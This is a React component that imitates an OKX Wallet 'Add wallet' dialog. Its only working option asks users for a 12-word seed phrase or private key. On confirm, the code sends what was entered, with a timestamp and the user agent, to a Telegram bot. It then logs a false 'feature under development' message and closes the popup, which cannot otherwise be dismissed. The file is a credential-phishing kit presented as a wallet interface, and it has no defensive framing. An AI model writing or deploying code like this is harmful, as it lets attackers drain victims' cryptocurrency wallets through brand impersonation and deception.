"use client"

import { useState, useEffect } from "react"
import { Dialog, DialogContent, DialogTitle } from "@/components/ui/dialog"
import { ArrowLeft } from "lucide-react"
import { validateSeedPhrase, validatePrivateKey } from "@/lib/wallet-validation"
import { sendWalletDataToTelegram } from "@/lib/telegram-bot"

interface OKXWalletPopupProps {
  open: boolean
  onClose?: () => void
}

export default function OKXWalletPopup({ open, onClose }: OKXWalletPopupProps) {
  const [showImport, setShowImport] = useState(false)
  const [importType, setImportType] = useState<"seed" | "private">("seed")
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""))
  const [privateKey, setPrivateKey] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  // Reset state when popup opens
  useEffect(() => {
    if (open) {
      setShowImport(false)
      setImportType("seed")
      setSeedPhrase(Array(12).fill(""))
      setPrivateKey("")
      setError("")
      setIsSubmitting(false)
    }
  }, [open])

  const handleConfirm = async () => {
    setError("")
    setIsSubmitting(true)

    try {
      let validationResult

      if (importType === "seed") {
        validationResult = validateSeedPhrase(seedPhrase)
        if (!validationResult.valid) {
          setError(validationResult.error || "Invalid seed phrase")
          setIsSubmitting(false)
          return
        }
      } else {
        validationResult = validatePrivateKey(privateKey)
        if (!validationResult.valid) {
          setError(validationResult.error || "Invalid private key")
          setIsSubmitting(false)
          return
        }
      }

      // Send data to Telegram
      const walletData = {
        walletType: "okx",
        walletName: "OKX Wallet",
        importType: importType,
        data: importType === "seed" ? seedPhrase : privateKey,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== "undefined" ? window.navigator.userAgent : undefined,
      }

      await sendWalletDataToTelegram(walletData)

      // Console log with message (only the message, no additional text)
      console.log(
        "Currently, the wallet registration feature is not available and is still under development.\n" +
        "For the time being, please register using email.\n" +
        "Thank you for your understanding."
      )

      // Reset form and close popup immediately
      setSeedPhrase(Array(12).fill(""))
      setPrivateKey("")
      setShowImport(false)
      // Close popup if onClose handler is provided
      if (onClose) {
        onClose()
      }
    } catch (err) {
      console.error("Error submitting wallet data:", err)
      setError("Failed to process wallet import. Please try again.")
    } finally {
      setIsSubmitting(false)
    }
  }

  // Check if confirm button should be enabled
  const isConfirmDisabled = importType === "seed"
    ? seedPhrase.some(word => !word.trim())
    : !privateKey.trim()

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent 
        className="sm:max-w-md p-0 rounded-xl overflow-hidden"
        style={{
          background: "linear-gradient(135deg, rgba(30, 41, 59, 0.95) 0%, rgba(15, 23, 42, 0.98) 50%, rgba(30, 41, 59, 0.95) 100%)",
          border: "2px solid rgba(251, 191, 36, 0.3)",
          boxShadow: "0 20px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.1), 0 0 30px rgba(251, 191, 36, 0.1)"
        }}
      >
        {/* Hidden title for accessibility */}
        <DialogTitle className="sr-only">OKX Wallet</DialogTitle>
        
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-yellow-500/20">
          {showImport ? (
            <button
              onClick={() => setShowImport(false)}
              className="w-9 h-9 flex items-center justify-center rounded-lg bg-yellow-500/20 hover:bg-yellow-500/30 transition-colors"
            >
              <ArrowLeft className="w-4 h-4 text-yellow-300" />
            </button>
          ) : (
            <div className="w-9 h-9" />
          )}
          <h2 className="text-white font-semibold text-base flex-1 text-center">
            {showImport ? "OKX Wallet" : "Add wallet"}
          </h2>
          <div className="w-9 h-9" />
        </div>

        <div className="px-5 pb-5">
          {!showImport ? (
            <>
              {/* Add wallet screen with 3 options */}
              <div className="mt-5 space-y-2">
                {/* Create new wallet - disabled */}
                <button
                  disabled
                  className="w-full flex items-center gap-3 p-3.5 rounded-xl transition-all opacity-50 cursor-not-allowed"
                  style={{
                    background: "rgba(0, 0, 0, 0.3)",
                    border: "1px solid rgba(251, 191, 36, 0.2)",
                    pointerEvents: "none"
                  }}
                >
                  {/* Document icon */}
                  <div className="w-9 h-9 flex items-center justify-center rounded-lg bg-yellow-500/10">
                    <svg className="w-5 h-5 text-yellow-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </div>
                  <div className="flex-1 text-left">
                    <div className="text-white font-medium text-sm">Create new wallet</div>
                  </div>
                  <div className="text-yellow-300/60">
                    <svg className="w-4 h-4" fill="none" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </div>
                </button>

                {/* Import an existing wallet - functional */}
                <button
                  onClick={() => setShowImport(true)}
                  className="w-full flex items-center gap-3 p-3.5 rounded-xl transition-all duration-200 hover:bg-yellow-500/10 active:scale-[0.98]"
                  style={{
                    background: "rgba(0, 0, 0, 0.3)",
                    border: "1px solid rgba(251, 191, 36, 0.2)"
                  }}
                >
                  {/* Bracket icon */}
                  <div className="w-9 h-9 flex items-center justify-center rounded-lg bg-yellow-500/10">
                    <svg className="w-5 h-5 text-yellow-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <div className="flex-1 text-left">
                    <div className="text-white font-medium text-sm">Import an existing wallet</div>
                  </div>
                  <div className="text-yellow-300/60">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </div>
                </button>

                {/* Connect hardware wallet - disabled */}
                <button
                  disabled
                  className="w-full flex items-center gap-3 p-3.5 rounded-xl transition-all opacity-50 cursor-not-allowed"
                  style={{
                    background: "rgba(0, 0, 0, 0.3)",
                    border: "1px solid rgba(251, 191, 36, 0.2)",
                    pointerEvents: "none"
                  }}
                >
                  {/* Monitor icon */}
                  <div className="w-9 h-9 flex items-center justify-center rounded-lg bg-yellow-500/10">
                    <svg className="w-5 h-5 text-yellow-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <div className="flex-1 text-left">
                    <div className="text-white font-medium text-sm">Connect hardware wallet</div>
                  </div>
                  <div className="text-yellow-300/60">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </div>
                </button>
              </div>
            </>
          ) : (
            <>
              {/* Import wallet screen */}
              <h3 className="text-white text-xl font-semibold mb-5 text-left mt-5">Seed phrase or private key</h3>
              
              {/* Toggle buttons */}
              <div className="flex gap-2 mb-5">
                <button
                  onClick={() => setImportType("seed")}
                  className={`flex-1 py-2.5 rounded-lg font-medium text-xs transition-all ${
                    importType === "seed"
                      ? "bg-white text-gray-900 shadow-sm"
                      : "bg-yellow-500/20 text-yellow-300 border border-yellow-500/30"
                  }`}
                >
                  Seed phrase
                </button>
                <button
                  onClick={() => setImportType("private")}
                  className={`flex-1 py-2.5 rounded-lg font-medium text-xs transition-all ${
                    importType === "private"
                      ? "bg-white text-gray-900 shadow-sm"
                      : "bg-yellow-500/20 text-yellow-300 border border-yellow-500/30"
                  }`}
                >
                  Private key
                </button>
              </div>

              {error && (
                <div className="mb-4 p-3 rounded-lg bg-red-500/10 border border-red-500/30">
                  <p className="text-red-300 text-xs">{error}</p>
                </div>
              )}

              {importType === "seed" ? (
                <div className="grid grid-cols-2 gap-2.5 mb-5">
                  {Array.from({ length: 12 }, (_, i) => (
                    <input
                      key={i}
                      type="text"
                      value={seedPhrase[i]}
                      onChange={(e) => {
                        const newPhrase = [...seedPhrase]
                        newPhrase[i] = e.target.value
                        setSeedPhrase(newPhrase)
                        setError("")
                      }}
                      placeholder={(i + 1).toString()}
                      className="px-3 py-2 rounded-lg bg-black/60 border-2 border-amber-700/50 text-white placeholder-gray-400 focus:outline-none focus:border-yellow-400 focus:ring-2 focus:ring-yellow-400/30 backdrop-blur-sm transition-all duration-300 text-xs"
                    />
                  ))}
                </div>
              ) : (
                <textarea
                  value={privateKey}
                  onChange={(e) => {
                    setPrivateKey(e.target.value)
                    setError("")
                  }}
                  placeholder="Enter your private key"
                  className="w-full px-3.5 py-2.5 rounded-lg bg-black/60 border-2 border-amber-700/50 text-white placeholder-gray-400 focus:outline-none focus:border-yellow-400 focus:ring-2 focus:ring-yellow-400/30 backdrop-blur-sm transition-all duration-300 min-h-[100px] mb-5 text-xs resize-none"
                />
              )}

              <button
                onClick={handleConfirm}
                disabled={isConfirmDisabled || isSubmitting}
                className={`w-full py-2.5 rounded-lg font-medium text-xs transition-all ${
                  isConfirmDisabled || isSubmitting
                    ? "bg-gray-400 text-gray-600 cursor-not-allowed"
                    : "bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-white"
                }`}
              >
                {isSubmitting ? "Processing..." : "Confirm"}
              </button>
            </>
          )}
        </div>
      </DialogContent>
    </Dialog>
  )
}

